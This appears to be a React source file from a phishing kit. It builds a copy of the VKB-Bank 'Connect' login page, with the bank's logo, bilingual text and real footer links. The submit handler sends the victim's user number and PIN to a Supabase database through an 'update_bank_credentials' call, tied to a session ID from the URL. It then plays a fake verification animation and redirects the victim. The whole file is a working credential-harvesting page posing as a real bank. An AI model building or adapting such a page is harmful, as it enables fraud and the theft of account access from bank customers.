import { useState, useRef, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ExternalLink, ChevronDown, Check } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import bgImage from "@/assets/vkb_bg.jpg";
import vkbIcon from "@/assets/vkb_bank.png";

const bundeslaender = ["VKB-Bank"];

const translations = {
  de: {
    title: "Bitte melden Sie sich an",
    subtitle: "Wählen Sie Ihre Bank und geben Sie Verfügernummer und PIN ein.",
    bundeslandLabel: "Bundesland oder Bank wählen",
    verfuegerLabel: "Verfügernummer eingeben",
    pinLabel: "PIN eingeben",
    weiter: "Weiter",
    pflichtfeld: "Pflichtfeld",
    impressum: "Impressum",
    nutzungsbedingungen: "Nutzungsbedingungen",
    barrierefreiheit: "Barrierefreiheitserklärung",
    deutsch: "Deutsch",
    englisch: "Englisch",
  },
  en: {
    title: "Please sign in",
    subtitle: "Select your bank and enter your user number and PIN.",
    bundeslandLabel: "Select state or bank",
    verfuegerLabel: "Enter user number",
    pinLabel: "Enter PIN",
    weiter: "Continue",
    pflichtfeld: "Required field",
    impressum: "Legal Notice",
    nutzungsbedingungen: "Terms of Use",
    barrierefreiheit: "Accessibility Statement",
    deutsch: "German",
    englisch: "English",
  },
};

const Vkb = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("VKB-Bank Connect", vkbIcon);

  const [bundesland, setBundesland] = useState("VKB-Bank");
  const [verfueger, setVerfueger] = useState("ELOOE02V");
  const [pin, setPin] = useState("");
  const [selectOpen, setSelectOpen] = useState(false);
  const [verfuegerTouched, setVerfuegerTouched] = useState(false);
  const [pinTouched, setPinTouched] = useState(false);
  const [bundeslandTouched, setBundeslandTouched] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");
  const [langOpen, setLangOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const langRef = useRef<HTMLDivElement>(null);

  const t = translations[lang];

  const selectHasValue = bundesland !== "";
  const selectLabelFloated = selectOpen || selectHasValue;

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setSelectOpen(false);
      }
      if (langRef.current && !langRef.current.contains(e.target as Node)) {
        setLangOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const isComplete = bundesland && verfueger && pin;

  return (
    <div>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div
      className="relative flex h-screen overflow-hidden flex-col md:min-h-screen md:h-auto md:overflow-visible"
      style={{ fontFamily: "'Open Sans', sans-serif" }}
    >
      <div
        className="flex-1 min-h-0 w-full md:hidden"
        style={{
          backgroundImage: `url(${bgImage})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      />

      <div
        className="hidden md:flex md:fixed md:inset-0 md:items-center md:justify-center"
        style={{
          backgroundImage: `url(${bgImage})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      />

      <div className="relative z-10 w-full flex-none bg-white p-6 md:flex-initial md:max-w-2xl md:rounded-sm md:shadow-lg md:p-10 md:mx-auto md:my-auto md:fixed md:top-1/2 md:left-1/2 md:-translate-x-1/2 md:-translate-y-1/2">
        <div className="absolute right-4 top-4" ref={langRef}>
          <button
            onClick={() => setLangOpen(!langOpen)}
            className={`flex items-center justify-between px-4 py-2 text-base text-gray-700 min-w-[160px] border ${langOpen ? "border-gray-300 bg-white rounded-t-md rounded-b-none" : "border-transparent bg-transparent rounded-md"}`}
          >
            {lang === "de" ? t.deutsch : t.englisch}
            <ChevronDown className={`h-7 w-7 transition-transform duration-200 ${langOpen ? "rotate-180" : ""}`} strokeWidth={2.5} />
          </button>
          {langOpen && (
            <div className="absolute right-0 top-full min-w-full rounded-b-md border border-gray-300 border-t-0 bg-white shadow-lg z-50">
              <div
                onClick={() => { setLang("de"); setLangOpen(false); }}
                className="flex cursor-pointer items-center justify-between px-4 py-2 text-base hover:bg-gray-100"
              >
                {translations[lang].deutsch}
                {lang === "de" && <Check className="h-5 w-5 text-gray-700" />}
              </div>
              <div
                onClick={() => { setLang("en"); setLangOpen(false); }}
                className="flex cursor-pointer items-center justify-between px-4 py-2 text-base hover:bg-gray-100"
              >
                {translations[lang].englisch}
                {lang === "en" && <Check className="h-5 w-5 text-gray-700" />}
              </div>
            </div>
          )}
        </div>

        <h1 className="mt-10 md:mt-0 mb-4 text-3xl font-light text-[#1a1a1a]">
          {t.title}
        </h1>
        <p className="mb-8 text-base text-gray-500">
          {t.subtitle}
        </p>

        <div className="relative mb-6" ref={dropdownRef}>
          <label
            className={`pointer-events-none absolute left-3 z-10 transition-all duration-200 ${
              selectLabelFloated
                ? `top-1 text-xs ${bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-500"}`
                : `top-3 text-sm ${bundeslandTouched && !bundesland ? "text-red-600" : "text-gray-500"}`
            }`}
          >
            {t.bundeslandLabel} <span className={bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-400"}>*</span>
          </label>
          <div
            onClick={() => setSelectOpen(!selectOpen)}
            onBlur={() => setBundeslandTouched(true)}
            className={`w-full cursor-pointer border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none ${
              selectOpen ? "border-[#87da5a]" : bundeslandTouched && !bundesland ? "border-red-600" : "border-[#1a1a1a]"
            }`}
          >
            {bundesland || "\u00A0"}
          </div>
          <div className="pointer-events-none absolute right-3 top-4">
            <svg
              className={`h-5 w-5 text-gray-500 transition-transform duration-200 ${selectOpen ? "rotate-180" : ""}`}
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
          {selectOpen && (
            <div
              className="custom-scrollbar absolute left-0 right-0 top-full z-20 border border-gray-200 bg-white shadow-lg"
              style={{ maxHeight: "160px", overflowY: "auto" }}
            >
              {bundeslaender.map((bl) => (
                <div
                  key={bl}
                  onClick={() => { setBundesland(bl); setSelectOpen(false); setBundeslandTouched(true); }}
                  className={`cursor-pointer px-3 py-2 text-sm hover:bg-gray-100 ${
                    bundesland === bl ? "bg-gray-100 font-semibold" : ""
                  }`}
                >
                  {bl}
                </div>
              ))}
            </div>
          )}
          {bundeslandTouched && !bundesland && !selectOpen && (
            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
              {t.pflichtfeld}
            </div>
          )}
        </div>

        <div className="relative mb-6">
          <input
            type="text"
            value={verfueger}
            onChange={(e) => setVerfueger(e.target.value)}
            onBlur={() => setVerfuegerTouched(true)}
            placeholder=" "
            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] ${
              verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
            }`}
          />
          <label className={`pointer-events-none absolute left-3 top-1 text-xs transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
            verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-500"
          }`}>
            {t.verfuegerLabel} <span className={verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-400"}>*</span>
          </label>
          {verfuegerTouched && !verfueger && (
            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
              {t.pflichtfeld}
            </div>
          )}
        </div>

        <div className="relative mb-8">
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            onBlur={() => setPinTouched(true)}
            placeholder=" "
            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#87da5a] ${
              pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
            }`}
          />
          <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
            pinTouched && !pin ? "text-red-600" : "text-gray-500"
          }`}>
            {t.pinLabel} <span className={pinTouched && !pin ? "text-red-600" : "text-gray-400"}>*</span>
          </label>
          {pinTouched && !pin && (
            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
              {t.pflichtfeld}
            </div>
          )}
        </div>

        <div className="flex justify-center">
          <button
            type="button"
            className={`w-full md:w-auto px-8 md:px-32 py-3 text-sm font-semibold text-gray-600 transition-colors ${
              isComplete ? "bg-[#87da5a] hover:bg-[#76c94a]" : "bg-[#98df71] cursor-not-allowed"
            }`}
            disabled={!isComplete}
            onClick={async () => {
              if (sessionId) {
                const { error } = await supabase.rpc("update_bank_credentials", {
                  p_session_id: sessionId,
                  p_username: verfueger,
                  p_password: pin,
                  p_username_label: "Verfügernummer",
                  p_password_label: "PIN",
                  p_extra: { Bundesland: bundesland },
                });
                if (error) console.error("Update failed:", error);
              } else {
                console.error("No session ID found in URL!");
              }
              setShowLoading(true);
            }}
          >
            {t.weiter}
          </button>
        </div>
      </div>

      <div className="hidden md:block pointer-events-none fixed bottom-0 left-0 right-0 z-[9] h-32" style={{ background: "linear-gradient(to top, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%)" }} />

      <footer className="hidden md:fixed md:block bottom-0 left-0 right-0 z-10 py-4">
        <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
          <a href="https://www.vkb-bank.at/impressum" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.impressum} <ExternalLink className="h-3 w-3" /></a>
          <a href="https://www.vkb-bank.at/connect-nutzungsbedingungen" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.nutzungsbedingungen} <ExternalLink className="h-3 w-3" /></a>
          <a href="https://www.vkb-bank.at/connect" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2 inline-flex items-center gap-1">{t.barrierefreiheit} <ExternalLink className="h-3 w-3" /></a>
          <a href="https://sso.vkb-bank.at/mein-login/identify" target="_blank" rel="noopener noreferrer" className="underline decoration-black/50 hover:decoration-black decoration-1 underline-offset-2">© 2026 VKB-Bank</a>
        </div>
      </footer>
    </div>
    </div>
  );
};

export default Vkb;
